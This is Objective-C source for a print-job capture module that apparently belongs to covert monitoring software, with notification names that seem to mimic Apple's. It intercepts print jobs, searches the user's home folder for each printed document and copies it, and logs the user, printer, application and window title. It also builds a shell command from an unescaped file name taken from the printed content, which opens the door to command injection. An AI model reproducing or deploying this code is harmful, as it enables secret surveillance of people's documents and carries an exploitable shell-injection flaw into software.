//
//  PrinterMonitorNotify.m
//  PrinterMonitorManager
//
//  Created by ophat on 11/12/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import "PrinterMonitorNotify.h"

#import "DateTimeFormat.h"
#import "SystemUtilsImpl.h"
#import "FxPrintJobEvent.h"
#import "DefStd.h"

#import <AppKit/AppKit.h>

@implementation PrinterMonitorNotify

@synthesize mNotifyThread;
@synthesize mDelegate, mSelector;

- (void) startCapture {
    DLog(@"#### PrintJob startCapture");
    if (mPrinterJobSocketReader == nil) {
        mPrinterJobSocketReader = [[SocketIPCReader alloc] initWithPortNumber:55501 andAddress:kLocalHostIP withSocketDelegate:self];
        [mPrinterJobSocketReader start];
    }
    
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(), CFSTR("com.applle.blblu.pj.enable"), (void *)self, nil, kCFNotificationDeliverImmediately);
}

- (void) stopCapture {
    DLog(@"#### PrintJob stopCapture");
    if (mPrinterJobSocketReader != nil) {
        [mPrinterJobSocketReader release];
        mPrinterJobSocketReader = nil;
    }
    
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(), CFSTR("com.applle.blblu.pj.disable"), (void *)self, nil, kCFNotificationDeliverImmediately);
}

#pragma mark - Printer Socket

- (void) dataDidReceivedFromSocket: (NSData*) aRawData {
    if (aRawData) {
        [NSThread detachNewThreadSelector:@selector(collectPrinterJobData:) toTarget:self withObject:aRawData];
    }
}

- (void) collectPrinterJobData: (NSData *) aRawData {
    @try {
        NSAutoreleasePool *pool     = [[NSAutoreleasePool alloc] init];
        
        NSDictionary *printerJob    = [NSUnarchiver unarchiveObjectWithData:aRawData];
        NSString *printerJobFile    = [printerJob objectForKey:@"PJFile"];
        NSString *printerJobCache   = [printerJob objectForKey:@"PJCache"];
        NSNumber *printerJobID      = [printerJob objectForKey:@"PJID"];
        NSNumber *frontmostPID      = [printerJob objectForKey:@"PID"];
        [self capturePrinterJobFile:printerJobFile cache:printerJobCache ID:printerJobID pid:frontmostPID];
        
        [pool drain];
    }
    @catch (NSException *exception) {
        DLog(@"Collect printer job data exception : %@", exception);
    }
    @finally {
        ;
    }
}

- (void) capturePrinterJobFile: (NSString *) aFilePath cache: (NSString *) aCache ID: (NSNumber *) aID pid: (NSNumber *) aPID {
    if ([self.mDelegate respondsToSelector:self.mSelector]) {
        NSFileManager *fileManager = [NSFileManager defaultManager];
        
        NSDictionary *cache = [self dictionaryFromPrinterJobCache:aCache];
        
        int totalPages = 0;
        NSString *owner = [cache objectForKey:@"Username"];
        NSString *printer = [cache objectForKey:@"Destination"]; // /Users/makara/.cups/lpoptions store printer name too, where makara is logon user
        NSString *submitDate = [cache objectForKey:@"Completed"];
        if (submitDate.length == 0) {
            submitDate = [DateTimeFormat phoenixDateTime];
        } else {
            submitDate = [DateTimeFormat phoenixDateTime:[NSDate dateWithTimeIntervalSince1970:submitDate.doubleValue]];
        }
        
        NSError *error = nil;
        NSString *printerFileContent = [[[NSString alloc] initWithContentsOfFile:aFilePath encoding:NSASCIIStringEncoding error:&error] autorelease];
        
        if (!error && printerFileContent != nil) {
            // File path, name, size
            NSString * fileName = @"";
            NSString * filePath = @"";
            unsigned long long fileSize = 0;
            
            NSArray *fileNameComponents = [printerFileContent componentsSeparatedByString:@"obj\n("];
            if (fileNameComponents.count > 1) {
                fileName = [fileNameComponents objectAtIndex:1];
                fileName = [[fileName componentsSeparatedByString:@")\n"] firstObject];
                fileName = [fileName stringByReplacingOccurrencesOfString:@"\\" withString:@""];
            }
            DLog(@"fileName from {obj[NEW LINE]( : %@", fileName);
            
            // Search filePath from fileName if found fileName
            if (fileName.length > 0) {
                if ([fileName rangeOfString:@"."].location == NSNotFound) {
                    filePath = [self runAsCommand:[NSString stringWithFormat:@"mdfind \"kMDItemFSName == '%@.*'\" -onlyin ~",fileName]];
                    filePath = [[filePath componentsSeparatedByString:@"\n"] firstObject];
                    filePath = [filePath stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
                    if (filePath.length == 0) {
                        filePath = [self runAsCommand:[NSString stringWithFormat:@"mdfind \"kMDItemFSName == '%@*'\" -onlyin ~",fileName]];
                    }
                }
                else {
                    filePath = [self runAsCommand:[NSString stringWithFormat:@"mdfind \"kMDItemFSName == '%@*'\" -onlyin ~",fileName]];
                }
                
                filePath = [[filePath componentsSeparatedByString:@"\n"] firstObject];
            }
            DLog(@"filePath from {mdfind} : %@", filePath);
            
            // If found filePath, correct fileName according to filePath (may be partial match) otherwise use d000xx-00x
            if (filePath.length > 0) {
                fileName = filePath.lastPathComponent;
                
                // Make copy
                NSString *copyPath = [aFilePath stringByDeletingLastPathComponent];
                copyPath = [copyPath stringByAppendingString:@"/"];
                copyPath = [copyPath stringByAppendingString:fileName];
                NSError *copyError = nil;
                [fileManager copyItemAtPath:filePath toPath:copyPath error:&copyError];
                if (copyError) {
                    DLog(@"Make copy of original printed file error : %@", copyError);
                }
                
                filePath = copyPath;
                
                // Here onward, use filePath from mdfind so delete aFilePath
                [fileManager removeItemAtPath:aFilePath error:nil];
            }
            else {
                fileName = aFilePath.lastPathComponent;
                filePath = aFilePath;
            }
            
            NSDictionary *attrs = [fileManager attributesOfItemAtPath:filePath error:&error];
            if (!error) {
                fileSize = [attrs fileSize];
            }
            
            NSString *appID   = nil;
            NSString *appName = nil;
            NSString *title   = nil;
            
            NSRunningApplication *rApp = [NSRunningApplication runningApplicationWithProcessIdentifier:aPID.intValue];
            if (rApp) {
                appID   = rApp.bundleIdentifier;
                appName = rApp.localizedName;
                title   = [SystemUtilsImpl frontApplicationWindowTitleWithPID:aPID];
            } else {
                appID   = [SystemUtilsImpl frontApplicationID];
                appName = [SystemUtilsImpl frontApplicationName];
                title   = [SystemUtilsImpl frontApplicationWindowTitle];
            }
            
            DLog(@"######### Printer Job");
            DLog(@"appID        %@", appID);
            DLog(@"appName      %@", appName);
            DLog(@"title        %@", title);
            DLog(@"aID          %@", aID);
            DLog(@"owner        %@", owner);
            DLog(@"printer      %@", printer);
            DLog(@"submitDate   %@", submitDate);
            DLog(@"fileName     %@", fileName);
            DLog(@"filePath     %@", filePath);
            DLog(@"totalPages   %d", totalPages); // Cannot capture, totalpage = 0
            DLog(@"fileSize     %llu", fileSize);
            
            FxPrintJobEvent * printJobEvent = [[FxPrintJobEvent alloc] init];
            [printJobEvent setDateTime:[DateTimeFormat phoenixDateTime]];
            [printJobEvent setMUserLogonName:[SystemUtilsImpl userLogonName]];
            [printJobEvent setMApplicationID:appID];
            [printJobEvent setMApplicationName:appName];
            [printJobEvent setMTitle:title];
            [printJobEvent setMJobID:[aID description]];
            [printJobEvent setMOwnerName:owner];
            [printJobEvent setMPrinter:printer];
            [printJobEvent setMDocumentName:fileName];
            [printJobEvent setMSubmitTime:submitDate];
            [printJobEvent setMTotalPage:totalPages];
            [printJobEvent setMTotalByte:(NSUInteger)fileSize];
            [printJobEvent setMPathToData:filePath];
            
            [self.mDelegate performSelector:self.mSelector
                                   onThread:self.mNotifyThread
                                 withObject:printJobEvent
                              waitUntilDone:NO];
            
            [printJobEvent release];
        }
    }
}


#pragma mark - Ultilities

- (NSDictionary *) dictionaryFromPrinterJobCache: (NSString *) aCache {
    NSMutableDictionary *kv = [NSMutableDictionary dictionary];
    NSArray *pairKeyValues = [aCache componentsSeparatedByString:@"\n"];
    for (NSString *pair in pairKeyValues) {
        NSString *value = @"";
        NSString *key = [[pair componentsSeparatedByString:@" "] firstObject];
        NSRange r = [pair rangeOfString:key];
        if (r.location != NSNotFound) {
            @try {
                value = [pair substringFromIndex:r.location + r.length];
                value = [value stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
            } @catch (NSException *e) {
                DLog(@"Parse key value from Printer Job Cache exception : %@", e);
            }
        }
        
        if (key.length > 0 && value.length > 0) {
            [kv setObject:value forKey:key];
        }
    }
    DLog(@"kv : %@", kv);
    
    return kv;
}

#pragma mark CommandRunner

- (NSString *) runAsCommand :(NSString *) aCmd {
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
    
    NSPipe* pipe = [NSPipe pipe];
    NSTask* task = [[NSTask alloc] init];
    [task setLaunchPath: @"/bin/sh"];
    [task setArguments:@[@"-c", aCmd]];
    [task setStandardOutput:pipe];
    
    NSFileHandle* file = [pipe fileHandleForReading];
    [task launch];
    
    NSData *data = [file readDataToEndOfFile];
    
    [task waitUntilExit];
    [task release];
    
    NSString * result = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
    [file closeFile];
    
    [pool drain];
    
    return [result autorelease];
}

#pragma mark - Destroy

- (void) dealloc {
    [self stopCapture];
    
    [super dealloc];
}
@end
